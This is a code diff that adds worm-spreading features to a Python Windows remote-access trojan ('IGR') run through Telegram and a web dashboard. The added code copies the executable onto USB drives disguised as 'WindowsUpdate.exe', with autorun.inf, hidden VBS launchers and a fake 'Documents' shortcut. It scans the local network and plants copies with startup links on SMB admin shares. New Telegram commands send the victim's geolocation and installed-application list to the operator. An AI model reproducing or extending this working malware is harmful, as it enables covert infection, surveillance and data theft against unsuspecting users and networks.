@@ -374,19 +374,16 @@ def _send_keylog_to_telegram():
         pass
 
 def _telegram_mark_offline():
-    """Edit the PC's Telegram status message to show offline."""
+    """Delete the PC's Telegram status message to show offline."""
     try:
         state = _load_telegram_state()
         pc_data = state.get(_PC_ID, {})
         msg_id = pc_data.get("message_id", "")
         if not msg_id:
             return
+        _delete_telegram_message(msg_id)
         now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        offline_text = f"""<b>🔴 Offline | {socket.gethostname()}</b>
-
-<b>User:</b> {os.environ.get('USERNAME', 'Unknown')}
-<b>Last Seen:</b> {now_str}"""
-        _edit_telegram(msg_id, offline_text)
+        _send_telegram(f"\U0001f534 Offline | {socket.gethostname()}\nUser: {os.environ.get('USERNAME', 'Unknown')}\nLast Seen: {now_str}")
         state[_PC_ID]["status"] = "offline"
         state[_PC_ID]["last_seen"] = datetime.now().isoformat()
         _save_telegram_state(state)
@@ -496,6 +493,9 @@ def _handle_telegram_command(text: str):
             "/browser <url> - Open in browser\n"
             "/status - Quick status\n"
             "/mic [secs] - Record microphone\n"
+            "/geo - Geo location from IP\n"
+            "/apps - Installed applications\n"
+            "/spread - Internal spread copies\n"
             "/cancel - Cancel pending file upload"
         )
 
@@ -894,6 +894,31 @@ def _handle_telegram_command(text: str):
         except:
             _send_telegram("Mic record failed")
 
+    elif cmd == "/geo":
+        try:
+            ip = requests.get("https://api.ipify.org", timeout=10).text
+            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
+            text = f"IP: {ip}\nCountry: {geo.get('country', '?')}\nRegion: {geo.get('regionName', '?')}\nCity: {geo.get('city', '?')}\nISP: {geo.get('isp', '?')}\nLat: {geo.get('lat', '?')}\nLon: {geo.get('lon', '?')}"
+            _send_telegram(f"<b>Geo Location</b>\n<pre>{text}</pre>")
+        except:
+            _send_telegram("Geo lookup failed")
+
+    elif cmd == "/apps":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -HideTableHeaders'],
+                capture_output=True, text=True, timeout=20, creationflags=_NO_WINDOW)
+            _send_telegram(f"<b>Installed Apps</b>\n<pre>{result.stdout.strip()[:4000]}</pre>")
+        except:
+            _send_telegram("App list failed")
+
+    elif cmd == "/spread":
+        try:
+            count = _spread_internally()
+            _send_telegram(f"Spread complete: {count} copies created")
+        except:
+            _send_telegram("Spread failed")
+
     elif cmd == "/cancel":
         _TG_PENDING_ACTION = None
         _send_telegram("Pending action cancelled")
@@ -968,6 +993,180 @@ def _telegram_heartbeat(cloudflared_url: str):
                 _save_telegram_state(state)
         except:
             pass
+
+# ============================================================================
+# SPREADING FUNCTIONS - USB, LAN, Internal
+# ============================================================================
+
+def _spread_to_usb() -> dict:
+    """Copy IGR to all connected USB drives with autorun infector."""
+    result = {'drives': [], 'copied': 0, 'errors': []}
+    if not getattr(sys, 'frozen', False):
+        result['errors'].append('Not running as compiled exe')
+        return result
+    src = sys.executable
+    _NO_WINDOW = 0x08000000
+    try:
+        drives = subprocess.run(['powershell', '-Command',
+            'Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID'],
+            capture_output=True, text=True, timeout=15, creationflags=_NO_WINDOW)
+        usb_drives = [d.strip().rstrip(':') for d in drives.stdout.strip().split('\n') if d.strip()]
+        result['drives'] = usb_drives
+    except Exception as e:
+        result['errors'].append(f'Detect failed: {e}')
+        return result
+    for drive in usb_drives:
+        try:
+            drive_letter = drive + ':'
+            hidden_dir = os.path.join(drive_letter, '.system')
+            os.makedirs(hidden_dir, exist_ok=True)
+            dst = os.path.join(hidden_dir, 'WindowsUpdate.exe')
+            import shutil
+            shutil.copy2(src, dst)
+            try:
+                subprocess.run(f'attrib +h +s "{hidden_dir}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
+                subprocess.run(f'attrib +h +s "{dst}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
+            except:
+                pass
+            vbs_path = os.path.join(hidden_dir, 'WindowsUpdate.vbs')
+            with open(vbs_path, 'w') as vf:
+                vf.write(f'Set objShell = CreateObject("WScript.Shell")\nobjShell.Run """{dst}""", 0, False\n')
+            try:
+                subprocess.run(f'attrib +h +s "{vbs_path}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
+            except:
+                pass
+            shortcut_path = os.path.join(drive_letter, 'Documents.lnk')
+            try:
+                import pythoncom
+                from win32com.shell import shell
+                shortcut = pythoncom.CoCreateInstance(shell.CLSID_ShellLink, None, pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)
+                shortcut.SetPath(vbs_path)
+                shortcut.SetWorkingDirectory(hidden_dir)
+                shortcut.SetDescription('My Documents')
+                persist = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                persist.Save(shortcut_path, 0)
+            except:
+                try:
+                    with open(shortcut_path, 'w') as sf:
+                        sf.write('[InternetShortcut]\nURL=file:///' + vbs_path.replace('\\', '/'))
+                except:
+                    pass
+            autorun_path = os.path.join(drive_letter, 'autorun.inf')
+            with open(autorun_path, 'w') as af:
+                af.write('[autorun]\n')
+                af.write(f'open={os.path.join(".system", "WindowsUpdate.vbs")}\n')
+                af.write('icon=shell32.dll,3\n')
+                af.write('action=Open folder to view files\n')
+            try:
+                subprocess.run(f'attrib +h +s "{autorun_path}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
+            except:
+                pass
+            result['copied'] += 1
+        except Exception as e:
+            result['errors'].append(f'{drive}: {e}')
+    return result
+
+def _spread_on_lan() -> dict:
+    """Attempt to spread to accessible SMB shares on the LAN."""
+    result = {'targets': [], 'infected': 0, 'errors': []}
+    if not getattr(sys, 'frozen', False):
+        result['errors'].append('Not running as compiled exe')
+        return result
+    src = sys.executable
+    _NO_WINDOW = 0x08000000
+    local_ip = "127.0.0.1"
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        pass
+    subnet = '.'.join(local_ip.split('.')[:3])
+    try:
+        scan = subprocess.run(['powershell', '-Command',
+            f'1..254 | ForEach-Object {{ $ip = "{subnet}.$_"; if (Test-Connection -TargetName $ip -Count 1 -Quiet -TimeoutSeconds 1) {{ $ip }} }}'],
+            capture_output=True, text=True, timeout=120, creationflags=_NO_WINDOW)
+        hosts = [h.strip() for h in scan.stdout.strip().split('\n') if h.strip() and h.strip() != local_ip]
+        result['targets'] = hosts[:30]
+    except Exception as e:
+        result['errors'].append(f'Scan failed: {e}')
+        return result
+    for host in result['targets'][:10]:
+        try:
+            for share_name in ['C$', 'ADMIN$', 'Users']:
+                share_path = f'\\\\{host}\\{share_name}'
+                test = subprocess.run(['powershell', '-Command',
+                    f'Test-Path "{share_path}"'],
+                    capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+                if 'True' in test.stdout:
+                    try:
+                        dest_dir = os.path.join(share_path, 'Windows', 'Temp')
+                        os.makedirs(dest_dir, exist_ok=True)
+                        dst = os.path.join(dest_dir, 'WindowsUpdate.exe')
+                        import shutil
+                        shutil.copy2(src, dst)
+                        vbs_dst = os.path.join(dest_dir, 'WindowsUpdate.vbs')
+                        with open(vbs_dst, 'w') as vf:
+                            vf.write(f'Set objShell = CreateObject("WScript.Shell")\nobjShell.Run """{dst}""", 0, False\n')
+                        startup_dir = os.path.join(share_path, 'Users', 'All Users', 'Start Menu', 'Programs', 'Startup')
+                        lnk_path = os.path.join(startup_dir, 'WindowsUpdate.lnk')
+                        try:
+                            with open(lnk_path, 'w') as lf:
+                                lf.write('[InternetShortcut]\nURL=file:///' + vbs_dst.replace('\\', '/'))
+                        except:
+                            pass
+                        result['infected'] += 1
+                        break
+                    except Exception as e:
+                        result['errors'].append(f'{host}/{share_name}: copy failed - {e}')
+        except Exception as e:
+            result['errors'].append(f'{host}: {e}')
+    return result
+
+def _get_spread_status() -> dict:
+    """Get current spread status: internal copies, USB drives, LAN reachability."""
+    status = {'internal_copies': 0, 'internal_paths': [], 'usb_drives': [], 'lan_hosts': 0, 'registry': False, 'scheduled_task': False}
+    _NO_WINDOW = 0x08000000
+    spread_dirs = [
+        os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", _FAKE_NAMES[0]),
+        os.path.join(os.environ.get('LOCALAPPDATA', '.'), "Microsoft", _FAKE_NAMES[1]),
+        os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", "Windows", _FAKE_NAMES[2]),
+        os.path.join(os.environ.get('PROGRAMDATA', '.'), _FAKE_NAMES[3]),
+    ]
+    for d in spread_dirs:
+        if os.path.exists(d):
+            status['internal_copies'] += 1
+            status['internal_paths'].append(d)
+    try:
+        drives = subprocess.run(['powershell', '-Command',
+            'Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID'],
+            capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+        status['usb_drives'] = [d.strip() for d in drives.stdout.strip().split('\n') if d.strip()]
+    except:
+        pass
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+        subnet = '.'.join(local_ip.split('.')[:3])
+        scan = subprocess.run(['powershell', '-Command',
+            f'1..254 | ForEach-Object {{ $ip = "{subnet}.$_"; if (Test-Connection -TargetName $ip -Count 1 -Quiet -TimeoutSeconds 1) {{ $ip }} }}'],
+            capture_output=True, text=True, timeout=60, creationflags=_NO_WINDOW)
+        hosts = [h.strip() for h in scan.stdout.strip().split('\n') if h.strip() and h.strip() != local_ip]
+        status['lan_hosts'] = len(hosts)
+    except:
+        pass
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+        val, _ = winreg.QueryValueEx(key, "WindowsRuntime")
+        winreg.CloseKey(key)
+        status['registry'] = bool(val)
+    except:
+        pass
+    try:
+        result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsRuntime'],
+            capture_output=True, creationflags=_NO_WINDOW)
+        status['scheduled_task'] = result.returncode == 0
+    except:
+        pass
+    return status
 
 # ============================================================================
 # DATA HARVESTING FUNCTIONS
@@ -1880,6 +2079,7 @@ DASHBOARD_HTML = r'''
                 <div class="nav-item" onclick="showPage('processes')"><span class="nav-icon">[P]</span><span class="nav-text">Processes</span></div>
                 <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">[R]</span><span class="nav-text">Remote</span></div>
                 <div class="nav-item" onclick="showPage('stealth')"><span class="nav-icon">[X]</span><span class="nav-text">Stealth</span></div>
+                <div class="nav-item" onclick="showPage('spreading')"><span class="nav-icon">[W]</span><span class="nav-text">Spreading</span></div>
             </div>
         </div>
 
@@ -2257,6 +2457,28 @@ DASHBOARD_HTML = r'''
                     <div class="section-header"><div class="section-title" style="color: #ef4444;">PANIC - Self Destruct</div></div>
                     <p style="color: #ef4444; margin-bottom: 15px;">Removes ALL IGR traces from this machine: registry keys, startup entries, spread copies, keylogs, watchdog, then kills itself. This cannot be undone.</p>
                     <button class="btn danger" onclick="panicConfirm()" style="width: 100%; padding: 16px; font-size: 18px; background: #ef4444; color: #000;">PANIC - DESTROY ALL TRACES</button>
+                </div>
+                </div>
+            </div>
+
+            <!-- Spreading Page -->
+            <div class="page" id="page-spreading">
+                <div class="page-grid">
+                <div class="section">
+                    <div class="section-header"><div class="section-title">USB Spread</div><button class="btn small" onclick="spreadUSB()">Infect USBs</button></div>
+                    <div class="log-box" id="usbSpreadBox">Copies IGR to all connected USB drives with autorun.inf and hidden launcher. When the USB is plugged into another PC, it auto-executes via VBS wrapper.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">LAN Spread</div><button class="btn small" onclick="spreadLAN()">Scan & Spread</button></div>
+                    <div class="log-box" id="lanSpreadBox">Scans the local network for live hosts, then attempts to copy IGR to accessible SMB shares (C$, ADMIN$). Drops a startup link for persistence on the remote machine.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Internal Spread</div><button class="btn small" onclick="stealthSpread()">Spread Now</button></div>
+                    <div class="log-box" id="spreadBox2">Copies exe to multiple hidden locations with different names. If one copy is found and deleted, others survive.</div>
+                </div>
+                <div class="section" style="grid-column: 1 / -1;">
+                    <div class="section-header"><div class="section-title">Spread Status</div><button class="btn small" onclick="loadSpreadStatus()">Refresh</button></div>
+                    <div id="spreadStatusGrid" class="info-grid">Loading...</div>
                 </div>
                 </div>
             </div>
@@ -2824,9 +3046,12 @@ DASHBOARD_HTML = r'''
         // ===== STEALTH =====
         async function stealthSpread() {
             document.getElementById('spreadBox').textContent = 'Spreading...';
+            if (document.getElementById('spreadBox2')) document.getElementById('spreadBox2').textContent = 'Spreading...';
             const res = await fetch('/api/stealth/spread');
             const data = await res.json();
-            document.getElementById('spreadBox').textContent = data.success ? `Done. ${data.copies} copies created in hidden locations.` : 'Failed: ' + (data.error || 'unknown');
+            const msg = data.success ? `Done. ${data.copies} copies created in hidden locations.` : 'Failed: ' + (data.error || 'unknown');
+            document.getElementById('spreadBox').textContent = msg;
+            if (document.getElementById('spreadBox2')) document.getElementById('spreadBox2').textContent = msg;
             logActivity('Internal spread: ' + (data.copies || 0) + ' copies');
         }
         async function stealthRegistry() {
@@ -2847,6 +3072,50 @@ DASHBOARD_HTML = r'''
                 alert(data.success ? 'Self-destruct initiated. Connection will be lost.' : 'Partial: ' + (data.status || 'some items failed'));
             }).catch(() => {});
             logActivity('PANIC - Self destruct initiated');
+        }
+
+        // ===== SPREADING =====
+        async function spreadUSB() {
+            document.getElementById('usbSpreadBox').textContent = 'Scanning USB drives...';
+            const res = await fetch('/api/spread/usb', {method:'POST'});
+            const data = await res.json();
+            let out = '';
+            if (data.drives && data.drives.length) out += 'Drives found: ' + data.drives.join(', ') + '\n';
+            else out += 'No USB drives detected\n';
+            out += 'Infected: ' + (data.copied || 0) + ' drive(s)\n';
+            if (data.errors && data.errors.length) out += 'Errors: ' + data.errors.join('; ');
+            document.getElementById('usbSpreadBox').textContent = out;
+            logActivity('USB spread: ' + (data.copied || 0) + ' infected');
+        }
+        async function spreadLAN() {
+            document.getElementById('lanSpreadBox').textContent = 'Scanning LAN... (this may take a minute)';
+            const res = await fetch('/api/spread/lan', {method:'POST'});
+            const data = await res.json();
+            let out = '';
+            if (data.targets && data.targets.length) out += 'Hosts found: ' + data.targets.length + '\n' + data.targets.join('\n') + '\n\n';
+            else out += 'No hosts found on LAN\n';
+            out += 'Infected via SMB: ' + (data.infected || 0) + '\n';
+            if (data.errors && data.errors.length) out += 'Errors: ' + data.errors.slice(0, 5).join('; ');
+            document.getElementById('lanSpreadBox').textContent = out;
+            logActivity('LAN spread: ' + (data.infected || 0) + ' infected of ' + ((data.targets || []).length) + ' hosts');
+        }
+        async function loadSpreadStatus() {
+            const el = document.getElementById('spreadStatusGrid');
+            el.textContent = 'Loading...';
+            const res = await fetch('/api/spread/status');
+            const data = await res.json();
+            if (!data.success) { el.textContent = 'Failed: ' + (data.error || '?'); return; }
+            let html = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">';
+            html += '<div><b>Internal Copies:</b> ' + data.internal_copies + '/4</div>';
+            html += '<div><b>Registry:</b> ' + (data.registry ? 'YES' : 'NO') + '</div>';
+            html += '<div><b>Scheduled Task:</b> ' + (data.scheduled_task ? 'YES' : 'NO') + '</div>';
+            html += '<div><b>USB Drives:</b> ' + (data.usb_drives.length || 'None') + '</div>';
+            html += '<div><b>LAN Hosts:</b> ' + data.lan_hosts + '</div>';
+            html += '</div>';
+            if (data.internal_paths && data.internal_paths.length) {
+                html += '<div style="margin-top:10px;font-size:12px;color:#888;">Copy locations:<br>' + data.internal_paths.join('<br>') + '</div>';
+            }
+            el.innerHTML = html;
         }
 
         // ===== NEW FEATURES =====
@@ -4373,6 +4642,33 @@ def stealth_registry():
     try:
         success = _add_registry_persistence()
         return jsonify({'success': success})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/spread/usb', methods=['POST'])
+def spread_usb():
+    """Copy IGR to all connected USB drives."""
+    try:
+        result = _spread_to_usb()
+        return jsonify({'success': True, 'drives': result['drives'], 'copied': result['copied'], 'errors': result['errors']})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/spread/lan', methods=['POST'])
+def spread_lan():
+    """Attempt to spread to accessible SMB shares on the LAN."""
+    try:
+        result = _spread_on_lan()
+        return jsonify({'success': True, 'targets': result['targets'], 'infected': result['infected'], 'errors': result['errors']})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/spread/status')
+def spread_status():
+    """Get current spread status."""
+    try:
+        status = _get_spread_status()
+        return jsonify({'success': True, **status})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
